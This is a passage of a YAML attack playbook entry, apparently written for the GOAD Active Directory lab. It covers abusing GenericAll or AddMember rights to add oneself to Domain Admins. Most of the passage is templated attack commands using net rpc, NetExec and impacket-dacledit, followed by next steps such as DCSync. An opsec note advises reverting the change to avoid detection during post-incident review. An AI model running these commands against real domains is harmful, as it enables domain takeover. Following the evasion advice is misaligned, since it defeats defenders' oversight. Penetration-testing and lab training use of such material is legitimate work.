      - genericall
      - addmember
      - group
    description: >
      Exploit GenericAll or AddMember rights over a privileged group
      to add yourself as a member. GOAD has multiple ACL paths leading
      to Domain Admins via group membership.
    commands:
      - label: "Add self to target group via RPC"
        cmd: "net rpc group addmem 'Domain Admins' {USERNAME} -U '{DOMAIN}/{USERNAME}%{PASSWORD}' -S {DC_IP}"
      - label: "Add self to group via NetExec"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M groupmembership -o USER={USERNAME} GROUP='Domain Admins'"
      - label: "Add self via dacledit"
        cmd: "impacket-dacledit -action write -rights FullControl -principal {USERNAME} -target-dn 'CN=Domain Admins,CN=Users,DC=domain,DC=local' {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
      - label: "Verify membership"
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --groups"
    next:
      - Logout and re-login to get new Kerberos ticket with updated groups
      - DCSync with DA rights
      - Clean up group membership immediately
    opsec: >
      Group membership change logged (4728). Revert immediately after use to
      avoid detection during post-incident review.
    cleanup:
